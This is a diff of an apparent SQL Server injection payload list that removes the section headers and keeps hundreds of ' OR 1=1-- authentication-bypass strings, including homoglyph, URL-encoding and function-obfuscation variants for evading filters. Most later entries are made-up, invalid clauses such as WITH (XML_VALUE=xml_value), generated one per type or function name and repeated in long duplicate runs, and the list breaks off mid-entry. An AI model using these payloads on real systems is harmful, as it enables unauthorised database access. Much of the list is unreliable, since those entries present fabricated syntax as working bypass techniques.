@@ -105,2995 +105,1013 @@ SELECT * FROM sys.column_encryption_keys
 SELECT * FROM sys.external_libraries
 SELECT * FROM sys.filetables
 SELECT * FROM sys.ledger_table_history
--- Unicode Homoglyph Bypasses
-' OR 1=1ᅴ--  (U+1174)
-' OR 1=1℅--  (U+2105)
-' OR 1=1⁣--  (Zero-width space U+2063)
-' OR 1=1᠁--  (Mongolian ellipsis U+1801)
 
--- Multi-Byte Encoding Bypasses
+' OR 1=1ᅴ--
+' OR 1=1℅--
+' OR 1=1⁣--
+' OR 1=1᠁--
 ' OR 1=1%EF%BC%8D%EF%BC%8D (Fullwidth hyphen)
 ' OR 1=1%EF%B9%A3 (Arabic semicolon)
 ' OR 1=1%EF%BB%BF (BOM character)
-
--- Arithmetic Bypasses
 ' OR 1=0x1--
 ' OR 1=3-2--
 ' OR 1=1|1--
 ' OR 1=1^0--
 ' OR 1=1&1--
-
--- Bitwise Bypasses
 ' OR 1=~0--
 ' OR 1=1<<0--
 ' OR 1=1>>0--
-
--- JSON/Array Bypasses
 ' OR JSON_VALUE('{"a":1}','$.a')=1--
 ' OR ARRAY[1,2,3][1]=2--
-
--- Function Obfuscation
 ' OR 1=REPLACE(1,0,1)--
 ' OR 1=ASCII(CHAR(49))--
 ' OR 1=UNICODE(N'1')--
-
--- Timezone Bypasses
 ' OR 1=AT TIME ZONE 'UTC'--
 ' OR 1=SWITCHOFFSET(GETDATE(),'+00:00')--
-
--- Collation Bypasses
 ' OR 1=1 COLLATE SQL_Latin1_General_CP1_CI_AS--
 ' OR 'a'='A' COLLATE Latin1_General_BIN--
-
--- Window Function Bypasses
 ' OR 1=ROW_NUMBER() OVER(ORDER BY 1)--
 ' OR 1=RANK() OVER(ORDER BY 1)--
-
--- PIVOT Bypasses
 ' OR 1=(SELECT 1 FROM (SELECT 1 AS x) AS src PIVOT(MAX(x) FOR x IN([1])) AS pvt)--
-
--- APPLY Operator Bypasses
 ' OR 1=(SELECT TOP 1 1 FROM sys.objects OUTER APPLY sys.fn_helpcollations())--
-
--- Partitioning Bypasses
 ' OR 1=PARTITION(1 BY 1)--
-
--- Sequence Bypasses
 ' OR 1=NEXT VALUE FOR seq_name--
-
--- Temporal Table Bypasses
 ' OR 1=1 FOR SYSTEM_TIME ALL--
-
--- Graph Pattern Bypasses
 ' OR 1=SHORTEST_PATH((:A)-[:R]->(:B))--
-
--- Machine Learning Bypasses
 ' OR 1=PREDICT(MODEL=model_name,DATA=1)--
-
--- Polybase Bypasses
 ' OR 1=EXTERNAL_SCRIPT('R','1+1')--
-
--- Spatial Data Bypasses
 ' OR 1=geometry::STGeomFromText('POINT (1 1)',0).STX--
-
--- Full-Text Search Bypasses
 ' OR 1=CONTAINS(column,'"1"')--
-
--- Semantic Search Bypasses
 ' OR 1=1 IN SEMANTICKEYPHRASETABLE(table,column,'1').keyphrase--
-
--- FileStream Bypasses
 ' OR 1=GET_FILESTREAM_TRANSACTION_CONTEXT()--
-
--- Service Broker Bypasses
 ' OR 1=RECEIVE(1 FROM queue)--
-
--- Query Store Bypasses
 ' OR 1=1 OPTION(USE HINT('FORCE_LEGACY_CARDINALITY_ESTIMATION'))--
-
--- Memory-Optimized Bypasses
 ' OR 1=1 WITH (MEMORY_OPTIMIZED=ON)--
-
--- Columnstore Bypasses
 ' OR 1=1 WITH (COLUMNSTORE)--
-
--- In-Memory OLTP Bypasses
 ' OR 1=1 WITH (SCHEMA_ONLY)--
-
--- Compression Bypasses
 ' OR 1=COMPRESS('1')--
-
--- Encryption Bypasses
 ' OR 1=ENCRYPTBYKEY(KEY_GUID('key_name'),'1')--
-
--- Masking Bypasses
 ' OR 1=1 WITH (MASKING=FUNCTION 'default()')--
-
--- Dynamic Data Masking Bypasses
 ' OR 1=1 WITH (MASK=OFF)--
-
--- Row-Level Security Bypasses
 ' OR 1=1 WITH (SECURITY POLICY=OFF)--
-
--- Ledger Bypasses
 ' OR 1=1 WITH (LEDGER=ON)--
-
--- Hyperscale Bypasses
 ' OR 1=1 WITH (HYPERSCALE=ON)--
-
--- Stretch Database Bypasses
 ' OR 1=1 WITH (REMOTE_DATA_ARCHIVE=ON)--
-
--- External Table Bypasses
 ' OR 1=1 WITH (DATA_SOURCE=external_source)--
-
--- Partitioned View Bypasses
 ' OR 1=1 WITH (PARTITION=1)--
-
--- Change Tracking Bypasses
 ' OR 1=1 WITH (CHANGE_TRACKING_CONTEXT(1))--
-
--- Change Data Capture Bypasses
 ' OR 1=1 WITH (CDC=ON)--
-
--- Temporal History Bypasses
 ' OR 1=1 WITH (SYSTEM_VERSIONING=OFF)--
-
--- Graph Node Bypasses
 ' OR 1=1 WITH (NODE=ON)--
-
--- Graph Edge Bypasses
 ' OR 1=1 WITH (EDGE=ON)--
-
--- JSON Path Bypasses
 ' OR 1=JSON_PATH_EXISTS('{"a":1}','$.a')--
-
--- JSON Modification Bypasses
 ' OR 1=JSON_MODIFY('{"a":1}','$.a',2)--
-
--- XML Path Bypasses
 ' OR 1=1 FOR XML PATH(''), ROOT('root')--
-
--- XML Modification Bypasses
 ' OR 1=1 WITH XMLNAMESPACES('uri' AS ns)--
-
--- XML Index Bypasses
 ' OR 1=1 WITH (XML INDEX=xml_index)--
-
--- XML Schema Bypasses
 ' OR 1=1 WITH (XMLSCHEMA('uri','schema'))--
-
--- XML DML Bypasses
 ' OR 1=1 WITH (XML DML=ON)--
-
--- XML View Bypasses
 ' OR 1=1 WITH (XML VIEW=ON)--
-
--- XML Collection Bypasses
 ' OR 1=1 WITH (XML COLLECTION=collection)--
-
--- XML Template Bypasses
 ' OR 1=1 WITH (XML TEMPLATE=template)--
-
--- XML Large Object Bypasses
 ' OR 1=1 WITH (XML LOB=ON)--
-
--- XML Schema Collection Bypasses
 ' OR 1=1 WITH (XML SCHEMA COLLECTION=collection)--
-
--- XML Index View Bypasses
 ' OR 1=1 WITH (XML INDEX VIEW=view)--
-
--- XML Namespace Bypasses
 ' OR 1=1 WITH (XML NAMESPACE=namespace)--
-
--- XML Data Type Bypasses
 ' OR 1=1 WITH (XML DATA TYPE=type)--
-
--- XML Format Bypasses
 ' OR 1=1 WITH (XML FORMAT=format)--
-
--- XML Storage Bypasses
 ' OR 1=1 WITH (XML STORAGE=storage)--
-
--- XML Processing Bypasses
 ' OR 1=1 WITH (XML PROCESSING=processing)--
-
--- XML Validation Bypasses
 ' OR 1=1 WITH (XML VALIDATION=validation)--
-
--- XML Serialization Bypasses
 ' OR 1=1 WITH (XML SERIALIZATION=serialization)--
-
--- XML Compression Bypasses
 ' OR 1=1 WITH (XML COMPRESSION=compression)--
-
--- XML Encryption Bypasses
 ' OR 1=1 WITH (XML ENCRYPTION=encryption)--
-
--- XML Signature Bypasses
 ' OR 1=1 WITH (XML SIGNATURE=signature)--
-
--- XML Transform Bypasses
 ' OR 1=1 WITH (XML TRANSFORM=transform)--
-
--- XML Query Bypasses
 ' OR 1=1 WITH (XML QUERY=query)--
-
--- XML Value Bypasses
 ' OR 1=1 WITH (XML VALUE=value)--
-
--- XML Exist Bypasses
 ' OR 1=1 WITH (XML EXIST=exist)--
-
--- XML Modify Bypasses
 ' OR 1=1 WITH (XML MODIFY=modify)--
-
--- XML Nodes Bypasses
 ' OR 1=1 WITH (XML NODES=nodes)--
-
--- XML OpenXML Bypasses
 ' OR 1=1 WITH (XML OPENXML=openxml)--
-
--- XML Bulk Load Bypasses
 ' OR 1=1 WITH (XML BULK LOAD=bulkload)--
-
--- XML FOR Bypasses
 ' OR 1=1 WITH (XML FOR=for)--
-
--- XML AUTO Bypasses
 ' OR 1=1 WITH (XML AUTO=auto)--
-
--- XML EXPLICIT Bypasses
 ' OR 1=1 WITH (XML EXPLICIT=explicit)--
-
--- XML RAW Bypasses
 ' OR 1=1 WITH (XML RAW=raw)--
-
--- XML PATH Bypasses
 ' OR 1=1 WITH (XML PATH=path)--
-
--- XML ELEMENTS Bypasses
 ' OR 1=1 WITH (XML ELEMENTS=elements)--
-
--- XML BINARY BASE64 Bypasses
 ' OR 1=1 WITH (XML BINARY BASE64=binarybase64)--
-
--- XML TYPE Bypasses
 ' OR 1=1 WITH (XML TYPE=type)--
-
--- XMLSCHEMA Bypasses
 ' OR 1=1 WITH (XMLSCHEMA=xmlschema)--
-
--- XMLDATA Bypasses
 ' OR 1=1 WITH (XMLDATA=xmldata)--
-
--- XMLNAMESPACES Bypasses
 ' OR 1=1 WITH (XMLNAMESPACES=xmlnamespaces)--
-
--- XSINIL Bypasses
 ' OR 1=1 WITH (XSINIL=xsinil)--
-
--- ROOT Bypasses
 ' OR 1=1 WITH (ROOT=root)--
-
--- BINARY BASE64 Bypasses
 ' OR 1=1 WITH (BINARY BASE64=binarybase64)--
-
--- TRUNCATE_YEAR Bypasses
 ' OR 1=1 WITH (TRUNCATE_YEAR=truncateyear)--
-
--- FORMAT Bypasses
 ' OR 1=1 WITH (FORMAT=format)--
-
--- DATE_FORMAT Bypasses
 ' OR 1=1 WITH (DATE_FORMAT=dateformat)--
-
--- TIME_FORMAT Bypasses
 ' OR 1=1 WITH (TIME_FORMAT=timeformat)--
-
--- DATETIME_FORMAT Bypasses
 ' OR 1=1 WITH (DATETIME_FORMAT=datetimeformat)--
-
--- TIMESTAMP_FORMAT Bypasses
 ' OR 1=1 WITH (TIMESTAMP_FORMAT=timestampformat)--
-
--- DECIMAL Bypasses
 ' OR 1=1 WITH (DECIMAL=decimal)--
-
--- FLOAT Bypasses
 ' OR 1=1 WITH (FLOAT=float)--
-
--- REAL Bypasses
 ' OR 1=1 WITH (REAL=real)--
-
--- MONEY Bypasses
 ' OR 1=1 WITH (MONEY=money)--
-
--- SMALLMONEY Bypasses
 ' OR 1=1 WITH (SMALLMONEY=smallmoney)--
-
--- NUMERIC Bypasses
 ' OR 1=1 WITH (NUMERIC=numeric)--
-
--- SMALLINT Bypasses
 ' OR 1=1 WITH (SMALLINT=smallint)--
-
--- TINYINT Bypasses
 ' OR 1=1 WITH (TINYINT=tinyint)--
-
--- BIT Bypasses
 ' OR 1=1 WITH (BIT=bit)--
-
--- BIGINT Bypasses
 ' OR 1=1 WITH (BIGINT=bigint)--
-
--- INT Bypasses
 ' OR 1=1 WITH (INT=int)--
-
--- CHAR Bypasses
 ' OR 1=1 WITH (CHAR=char)--
-
--- VARCHAR Bypasses
 ' OR 1=1 WITH (VARCHAR=varchar)--
-
--- TEXT Bypasses
 ' OR 1=1 WITH (TEXT=text)--
-
--- NCHAR Bypasses
 ' OR 1=1 WITH (NCHAR=nchar)--
-
--- NVARCHAR Bypasses
 ' OR 1=1 WITH (NVARCHAR=nvarchar)--
-
--- NTEXT Bypasses
 ' OR 1=1 WITH (NTEXT=ntext)--
-
--- BINARY Bypasses
 ' OR 1=1 WITH (BINARY=binary)--
-
--- VARBINARY Bypasses
 ' OR 1=1 WITH (VARBINARY=varbinary)--
-
--- IMAGE Bypasses
 ' OR 1=1 WITH (IMAGE=image)--
-
--- UNIQUEIDENTIFIER Bypasses
 ' OR 1=1 WITH (UNIQUEIDENTIFIER=uniqueidentifier)--
-
--- SQL_VARIANT Bypasses
 ' OR 1=1 WITH (SQL_VARIANT=sql_variant)--
-
--- TABLE Bypasses
 ' OR 1=1 WITH (TABLE=table)--
-
--- CURSOR Bypasses
 ' OR 1=1 WITH (CURSOR=cursor)--
-
--- TIMESTAMP Bypasses
 ' OR 1=1 WITH (TIMESTAMP=timestamp)--
-
--- HIERARCHYID Bypasses
 ' OR 1=1 WITH (HIERARCHYID=hierarchyid)--
-
--- GEOMETRY Bypasses
 ' OR 1=1 WITH (GEOMETRY=geometry)--
-
--- GEOGRAPHY Bypasses
 ' OR 1=1 WITH (GEOGRAPHY=geography)--
-
--- DATETIME Bypasses
 ' OR 1=1 WITH (DATETIME=datetime)--
-
--- SMALLDATETIME Bypasses
 ' OR 1=1 WITH (SMALLDATETIME=smalldatetime)--
-
--- DATETIME2 Bypasses
 ' OR 1=1 WITH (DATETIME2=datetime2)--
-
--- DATETIMEOFFSET Bypasses
 ' OR 1=1 WITH (DATETIMEOFFSET=datetimeoffset)--
-
--- DATE Bypasses
 ' OR 1=1 WITH (DATE=date)--
-
--- TIME Bypasses
 ' OR 1=1 WITH (TIME=time)--
-
--- DATETRUNC Bypasses
 ' OR 1=1 WITH (DATETRUNC=datetrunc)--
-
--- EOMONTH Bypasses
 ' OR 1=1 WITH (EOMONTH=eomonth)--
-
--- SWITCHOFFSET Bypasses
 ' OR 1=1 WITH (SWITCHOFFSET=switchoffset)--
-
--- TODATETIMEOFFSET Bypasses
 ' OR 1=1 WITH (TODATETIMEOFFSET=todatetimeoffset)--
-
--- AT TIME ZONE Bypasses
 ' OR 1=1 WITH (AT TIME ZONE=attimezone)--
-
--- ISDATE Bypasses
 ' OR 1=1 WITH (ISDATE=isdate)--
-
--- DAY Bypasses
 ' OR 1=1 WITH (DAY=day)--
-
--- MONTH Bypasses
 ' OR 1=1 WITH (MONTH=month)--
-
--- YEAR Bypasses
 ' OR 1=1 WITH (YEAR=year)--
-
--- DATENAME Bypasses
 ' OR 1=1 WITH (DATENAME=datename)--
-
--- DATEPART Bypasses
 ' OR 1=1 WITH (DATEPART=datepart)--
-
--- GETDATE Bypasses
 ' OR 1=1 WITH (GETDATE=getdate)--
-
--- GETUTCDATE Bypasses
 ' OR 1=1 WITH (GETUTCDATE=getutcdate)--
-
--- SYSDATETIME Bypasses
 ' OR 1=1 WITH (SYSDATETIME=sysdatetime)--
-
--- SYSUTCDATETIME Bypasses
 ' OR 1=1 WITH (SYSUTCDATETIME=sysutcdatetime)--
-
--- SYSDATETIMEOFFSET Bypasses
 ' OR 1=1 WITH (SYSDATETIMEOFFSET=sysdatetimeoffset)--
-
--- CURRENT_TIMESTAMP Bypasses
 ' OR 1=1 WITH (CURRENT_TIMESTAMP=current_timestamp)--
-
--- CURRENT_TIMEZONE Bypasses
 ' OR 1=1 WITH (CURRENT_TIMEZONE=current_timezone)--
-
--- DATEDIFF Bypasses
 ' OR 1=1 WITH (DATEDIFF=datediff)--
-
--- DATEADD Bypasses
 ' OR 1=1 WITH (DATEADD=dateadd)--
-
--- ISNULL Bypasses
 ' OR 1=1 WITH (ISNULL=isnull)--
-
--- NULLIF Bypasses
 ' OR 1=1 WITH (NULLIF=nullif)--
-
--- COALESCE Bypasses
 ' OR 1=1 WITH (COALESCE=coalesce)--
-
--- IIF Bypasses
 ' OR 1=1 WITH (IIF=iif)--
-
--- CHOOSE Bypasses
 ' OR 1=1 WITH (CHOOSE=choose)--
-
--- TRY_CAST Bypasses
 ' OR 1=1 WITH (TRY_CAST=try_cast)--
-
--- TRY_CONVERT Bypasses
 ' OR 1=1 WITH (TRY_CONVERT=try_convert)--
-
--- TRY_PARSE Bypasses
 ' OR 1=1 WITH (TRY_PARSE=try_parse)--
-
--- PARSE Bypasses
 ' OR 1=1 WITH (PARSE=parse)--
-
--- FORMAT Bypasses
 ' OR 1=1 WITH (FORMAT=format)--
-
--- CONCAT Bypasses
 ' OR 1=1 WITH (CONCAT=concat)--
-
--- CONCAT_WS Bypasses
 ' OR 1=1 WITH (CONCAT_WS=concat_ws)--
-
--- STRING_AGG Bypasses
 ' OR 1=1 WITH (STRING_AGG=string_agg)--
-
--- STRING_SPLIT Bypasses
 ' OR 1=1 WITH (STRING_SPLIT=string_split)--
-
--- STRING_ESCAPE Bypasses
 ' OR 1=1 WITH (STRING_ESCAPE=string_escape)--
-
--- TRANSLATE Bypasses
 ' OR 1=1 WITH (TRANSLATE=translate)--
-
--- TRIM Bypasses
 ' OR 1=1 WITH (TRIM=trim)--
-
--- LTRIM Bypasses
 ' OR 1=1 WITH (LTRIM=ltrim)--
-
--- RTRIM Bypasses
 ' OR 1=1 WITH (RTRIM=rtrim)--
-
--- UPPER Bypasses
 ' OR 1=1 WITH (UPPER=upper)--
-
--- LOWER Bypasses
 ' OR 1=1 WITH (LOWER=lower)--
-
--- REVERSE Bypasses
 ' OR 1=1 WITH (REVERSE=reverse)--
-
--- REPLICATE Bypasses
 ' OR 1=1 WITH (REPLICATE=replicate)--
-
--- SPACE Bypasses
 ' OR 1=1 WITH (SPACE=space)--
-
--- STUFF Bypasses
 ' OR 1=1 WITH (STUFF=stuff)--
-
--- SUBSTRING Bypasses
 ' OR 1=1 WITH (SUBSTRING=substring)--
-
--- LEFT Bypasses
 ' OR 1=1 WITH (LEFT=left)--
-
--- RIGHT Bypasses
 ' OR 1=1 WITH (RIGHT=right)--
-
--- CHARINDEX Bypasses
 ' OR 1=1 WITH (CHARINDEX=charindex)--
-
--- PATINDEX Bypasses
 ' OR 1=1 WITH (PATINDEX=patindex)--
-
--- REPLACE Bypasses
 ' OR 1=1 WITH (REPLACE=replace)--
-
--- STR Bypasses
 ' OR 1=1 WITH (STR=str)--
-
--- ASCII Bypasses
 ' OR 1=1 WITH (ASCII=ascii)--
-
--- UNICODE Bypasses
 ' OR 1=1 WITH (UNICODE=unicode)--
-
--- NCHAR Bypasses
 ' OR 1=1 WITH (NCHAR=nchar)--
-
--- CHAR Bypasses
 ' OR 1=1 WITH (CHAR=char)--
-
--- SOUNDEX Bypasses
 ' OR 1=1 WITH (SOUNDEX=soundex)--
-
--- DIFFERENCE Bypasses
 ' OR 1=1 WITH (DIFFERENCE=difference)--
-
--- QUOTENAME Bypasses
 ' OR 1=1 WITH (QUOTENAME=quotename)--
-
--- PARSENAME Bypasses
 ' OR 1=1 WITH (PARSENAME=parsename)--
-
--- ISNUMERIC Bypasses
 ' OR 1=1 WITH (ISNUMERIC=isnumeric)--
-
--- ISJSON Bypasses
 ' OR 1=1 WITH (ISJSON=isjson)--
-
--- JSON_VALUE Bypasses
 ' OR 1=1 WITH (JSON_VALUE=json_value)--
-
--- JSON_QUERY Bypasses
 ' OR 1=1 WITH (JSON_QUERY=json_query)--
-
--- JSON_MODIFY Bypasses
 ' OR 1=1 WITH (JSON_MODIFY=json_modify)--
-
--- OPENJSON Bypasses
 ' OR 1=1 WITH (OPENJSON=openjson)--
-
--- FOR JSON Bypasses
 ' OR 1=1 WITH (FOR JSON=for_json)--
-
--- JSON_PATH_EXISTS Bypasses
 ' OR 1=1 WITH (JSON_PATH_EXISTS=json_path_exists)--
-
--- JSON_ARRAY Bypasses
 ' OR 1=1 WITH (JSON_ARRAY=json_array)--
-
--- JSON_OBJECT Bypasses
 ' OR 1=1 WITH (JSON_OBJECT=json_object)--
-
--- JSON_ARRAY_AGG Bypasses
 ' OR 1=1 WITH (JSON_ARRAY_AGG=json_array_agg)--
-
--- JSON_OBJECT_AGG Bypasses
 ' OR 1=1 WITH (JSON_OBJECT_AGG=json_object_agg)--
-
--- IS_XML Bypasses
 ' OR 1=1 WITH (IS_XML=is_xml)--
-
--- XML_VALUE Bypasses
 ' OR 1=1 WITH (XML_VALUE=xml_value)--
-
--- XML_QUERY Bypasses
 ' OR 1=1 WITH (XML_QUERY=xml_query)--
-
--- XML_EXIST Bypasses
 ' OR 1=1 WITH (XML_EXIST=xml_exist)--
-
--- XML_MODIFY Bypasses
 ' OR 1=1 WITH (XML_MODIFY=xml_modify)--
-
--- XML_NODES Bypasses
 ' OR 1=1 WITH (XML_NODES=xml_nodes)--
-
--- XML_OPENXML Bypasses
 ' OR 1=1 WITH (XML_OPENXML=xml_openxml)--
-
--- XML_BULKLOAD Bypasses
 ' OR 1=1 WITH (XML_BULKLOAD=xml_bulkload)--
-
--- FOR XML Bypasses
 ' OR 1=1 WITH (FOR XML=for_xml)--
-
--- XML_SCHEMA Bypasses
 ' OR 1=1 WITH (XML_SCHEMA=xml_schema)--
-
--- XML_SCHEMA_NAMESPACE Bypasses
 ' OR 1=1 WITH (XML_SCHEMA_NAMESPACE=xml_schema_namespace)--
-
--- XML_DATATYPE Bypasses
 ' OR 1=1 WITH (XML_DATATYPE=xml_datatype)--
-
--- XML_INDEX Bypasses
 ' OR 1=1 WITH (XML_INDEX=xml_index)--
-
--- XML_VIEW Bypasses
 ' OR 1=1 WITH (XML_VIEW=xml_view)--
-
--- XML_COLLECTION Bypasses
 ' OR 1=1 WITH (XML_COLLECTION=xml_collection)--
-
--- XML_TEMPLATE Bypasses
 ' OR 1=1 WITH (XML_TEMPLATE=xml_template)--
-
--- XML_LOB Bypasses
 ' OR 1=1 WITH (XML_LOB=xml_lob)--
-
--- XML_SCHEMA_COLLECTION Bypasses
 ' OR 1=1 WITH (XML_SCHEMA_COLLECTION=xml_schema_collection)--
-
--- XML_INDEX_VIEW Bypasses
 ' OR 1=1 WITH (XML_INDEX_VIEW=xml_index_view)--
-
--- XML_NAMESPACE Bypasses
 ' OR 1=1 WITH (XML_NAMESPACE=xml_namespace)--
-
--- XML_DATA_TYPE Bypasses
 ' OR 1=1 WITH (XML_DATA_TYPE=xml_data_type)--
-
--- XML_FORMAT Bypasses
 ' OR 1=1 WITH (XML_FORMAT=xml_format)--
-
--- XML_STORAGE Bypasses
 ' OR 1=1 WITH (XML_STORAGE=xml_storage)--
-
--- XML_PROCESSING Bypasses
 ' OR 1=1 WITH (XML_PROCESSING=xml_processing)--
-
--- XML_VALIDATION Bypasses
 ' OR 1=1 WITH (XML_VALIDATION=xml_validation)--
-
--- XML_SERIALIZATION Bypasses
 ' OR 1=1 WITH (XML_SERIALIZATION=xml_serialization)--
-
--- XML_COMPRESSION Bypasses
 ' OR 1=1 WITH (XML_COMPRESSION=xml_compression)--
-
--- XML_ENCRYPTION Bypasses
 ' OR 1=1 WITH (XML_ENCRYPTION=xml_encryption)--
-
--- XML_SIGNATURE Bypasses
 ' OR 1=1 WITH (XML_SIGNATURE=xml_signature)--
-
--- XML_TRANSFORM Bypasses
 ' OR 1=1 WITH (XML_TRANSFORM=xml_transform)--
-
--- XML_QUERY Bypasses
 ' OR 1=1 WITH (XML_QUERY=xml_query)--
-
--- XML_VALUE Bypasses
 ' OR 1=1 WITH (XML_VALUE=xml_value)--
-
--- XML_EXIST Bypasses
 ' OR 1=1 WITH (XML_EXIST=xml_exist)--
-
--- XML_MODIFY Bypasses
 ' OR 1=1 WITH (XML_MODIFY=xml_modify)--
-
--- XML_NODES Bypasses
 ' OR 1=1 WITH (XML_NODES=xml_nodes)--
-
--- XML_OPENXML Bypasses
 ' OR 1=1 WITH (XML_OPENXML=xml_openxml)--
-
--- XML_BULKLOAD Bypasses
 ' OR 1=1 WITH (XML_BULKLOAD=xml_bulkload)--
-
--- XML_FOR Bypasses
 ' OR 1=1 WITH (XML_FOR=xml_for)--
-
--- XML_AUTO Bypasses
 ' OR 1=1 WITH (XML_AUTO=xml_auto)--
-
--- XML_EXPLICIT Bypasses
 ' OR 1=1 WITH (XML_EXPLICIT=xml_explicit)--
-
--- XML_RAW Bypasses
 ' OR 1=1 WITH (XML_RAW=xml_raw)--
-
--- XML_PATH Bypasses
 ' OR 1=1 WITH (XML_PATH=xml_path)--
-
--- XML_ELEMENTS Bypasses
 ' OR 1=1 WITH (XML_ELEMENTS=xml_elements)--
-
--- XML_BINARY_BASE64 Bypasses
 ' OR 1=1 WITH (XML_BINARY_BASE64=xml_binary_base64)--
-
--- XML_TYPE Bypasses
 ' OR 1=1 WITH (XML_TYPE=xml_type)--
-
--- XMLSCHEMA Bypasses
 ' OR 1=1 WITH (XMLSCHEMA=xmlschema)--
-
--- XMLDATA Bypasses
 ' OR 1=1 WITH (XMLDATA=xmldata)--
-
--- XMLNAMESPACES Bypasses
 ' OR 1=1 WITH (XMLNAMESPACES=xmlnamespaces)--
-
--- XSINIL Bypasses
 ' OR 1=1 WITH (XSINIL=xsinil)--
-
--- ROOT Bypasses
 ' OR 1=1 WITH (ROOT=root)--
-
--- BINARY_BASE64 Bypasses
 ' OR 1=1 WITH (BINARY_BASE64=binary_base64)--
-
--- TRUNCATE_YEAR Bypasses
 ' OR 1=1 WITH (TRUNCATE_YEAR=truncate_year)--
-
--- FORMAT Bypasses
 ' OR 1=1 WITH (FORMAT=format)--
-
--- DATE_FORMAT Bypasses
 ' OR 1=1 WITH (DATE_FORMAT=date_format)--
-
--- TIME_FORMAT Bypasses
 ' OR 1=1 WITH (TIME_FORMAT=time_format)--
-
--- DATETIME_FORMAT Bypasses
 ' OR 1=1 WITH (DATETIME_FORMAT=datetime_format)--
-
--- TIMESTAMP_FORMAT Bypasses
 ' OR 1=1 WITH (TIMESTAMP_FORMAT=timestamp_format)--
-
--- DECIMAL Bypasses
 ' OR 1=1 WITH (DECIMAL=decimal)--
-
--- FLOAT Bypasses
 ' OR 1=1 WITH (FLOAT=float)--
-
--- REAL Bypasses
 ' OR 1=1 WITH (REAL=real)--
-
--- MONEY Bypasses
 ' OR 1=1 WITH (MONEY=money)--
-
--- SMALLMONEY Bypasses
 ' OR 1=1 WITH (SMALLMONEY=smallmoney)--
-
--- NUMERIC Bypasses
 ' OR 1=1 WITH (NUMERIC=numeric)--
-
--- SMALLINT Bypasses
 ' OR 1=1 WITH (SMALLINT=smallint)--
-
--- TINYINT Bypasses
 ' OR 1=1 WITH (TINYINT=tinyint)--
-
--- BIT Bypasses
 ' OR 1=1 WITH (BIT=bit)--
-
--- BIGINT Bypasses
 ' OR 1=1 WITH (BIGINT=bigint)--
-
--- INT Bypasses
 ' OR 1=1 WITH (INT=int)--
-
--- CHAR Bypasses
 ' OR 1=1 WITH (CHAR=char)--
-
--- VARCHAR Bypasses
 ' OR 1=1 WITH (VARCHAR=varchar)--
-
--- TEXT Bypasses
 ' OR 1=1 WITH (TEXT=text)--
-
--- NCHAR Bypasses
 ' OR 1=1 WITH (NCHAR=nchar)--
-
--- NVARCHAR Bypasses
 ' OR 1=1 WITH (NVARCHAR=nvarchar)--
-
--- NTEXT Bypasses
 ' OR 1=1 WITH (NTEXT=ntext)--
-
--- BINARY Bypasses
 ' OR 1=1 WITH (BINARY=binary)--
-
--- VARBINARY Bypasses
 ' OR 1=1 WITH (VARBINARY=varbinary)--
-
--- IMAGE Bypasses
 ' OR 1=1 WITH (IMAGE=image)--
-
--- UNIQUEIDENTIFIER Bypasses
 ' OR 1=1 WITH (UNIQUEIDENTIFIER=uniqueidentifier)--
-
--- SQL_VARIANT Bypasses
 ' OR 1=1 WITH (SQL_VARIANT=sql_variant)--
-
--- TABLE Bypasses
 ' OR 1=1 WITH (TABLE=table)--
-
--- CURSOR Bypasses
 ' OR 1=1 WITH (CURSOR=cursor)--
-
--- TIMESTAMP Bypasses
 ' OR 1=1 WITH (TIMESTAMP=timestamp)--
-
--- HIERARCHYID Bypasses
 ' OR 1=1 WITH (HIERARCHYID=hierarchyid)--
-
--- GEOMETRY Bypasses
 ' OR 1=1 WITH (GEOMETRY=geometry)--
-
--- GEOGRAPHY Bypasses
 ' OR 1=1 WITH (GEOGRAPHY=geography)--
-
--- DATETIME Bypasses
 ' OR 1=1 WITH (DATETIME=datetime)--
-
--- SMALLDATETIME Bypasses
 ' OR 1=1 WITH (SMALLDATETIME=smalldatetime)--
-
--- DATETIME2 Bypasses
 ' OR 1=1 WITH (DATETIME2=datetime2)--
-
--- DATETIMEOFFSET Bypasses
 ' OR 1=1 WITH (DATETIMEOFFSET=datetimeoffset)--
-
--- DATE Bypasses
 ' OR 1=1 WITH (DATE=date)--
-
--- TIME Bypasses
 ' OR 1=1 WITH (TIME=time)--
-
--- DATETRUNC Bypasses
 ' OR 1=1 WITH (DATETRUNC=datetrunc)--
-
--- EOMONTH Bypasses
 ' OR 1=1 WITH (EOMONTH=eomonth)--
-
--- SWITCHOFFSET Bypasses
 ' OR 1=1 WITH (SWITCHOFFSET=switchoffset)--
-
--- TODATETIMEOFFSET Bypasses
 ' OR 1=1 WITH (TODATETIMEOFFSET=todatetimeoffset)--
-
--- AT TIME ZONE Bypasses
 ' OR 1=1 WITH (AT TIME ZONE=at_time_zone)--
-
--- ISDATE Bypasses
 ' OR 1=1 WITH (ISDATE=isdate)--
-
--- DAY Bypasses
 ' OR 1=1 WITH (DAY=day)--
-
--- MONTH Bypasses
 ' OR 1=1 WITH (MONTH=month)--
-
--- YEAR Bypasses
 ' OR 1=1 WITH (YEAR=year)--
-
--- DATENAME Bypasses
 ' OR 1=1 WITH (DATENAME=datename)--
-
--- DATEPART Bypasses
 ' OR 1=1 WITH (DATEPART=datepart)--
-
--- GETDATE Bypasses
 ' OR 1=1 WITH (GETDATE=getdate)--
-
--- GETUTCDATE Bypasses
 ' OR 1=1 WITH (GETUTCDATE=getutcdate)--
-
--- SYSDATETIME Bypasses
 ' OR 1=1 WITH (SYSDATETIME=sysdatetime)--
-
--- SYSUTCDATETIME Bypasses
 ' OR 1=1 WITH (SYSUTCDATETIME=sysutcdatetime)--
-
--- SYSDATETIMEOFFSET Bypasses
 ' OR 1=1 WITH (SYSDATETIMEOFFSET=sysdatetimeoffset)--
-
--- CURRENT_TIMESTAMP Bypasses
 ' OR 1=1 WITH (CURRENT_TIMESTAMP=current_timestamp)--
-
--- CURRENT_TIMEZONE Bypasses
 ' OR 1=1 WITH (CURRENT_TIMEZONE=current_timezone)--
-
--- DATEDIFF Bypasses
 ' OR 1=1 WITH (DATEDIFF=datediff)--
-
--- DATEADD Bypasses
 ' OR 1=1 WITH (DATEADD=dateadd)--
-
--- ISNULL Bypasses
 ' OR 1=1 WITH (ISNULL=isnull)--
-
--- NULLIF Bypasses
 ' OR 1=1 WITH (NULLIF=nullif)--
-
--- COALESCE Bypasses
 ' OR 1=1 WITH (COALESCE=coalesce)--
-
--- IIF Bypasses
 ' OR 1=1 WITH (IIF=iif)--
-
--- CHOOSE Bypasses
 ' OR 1=1 WITH (CHOOSE=choose)--
-
--- TRY_CAST Bypasses
 ' OR 1=1 WITH (TRY_CAST=try_cast)--
-
--- TRY_CONVERT Bypasses
 ' OR 1=1 WITH (TRY_CONVERT=try_convert)--
-
--- TRY_PARSE Bypasses
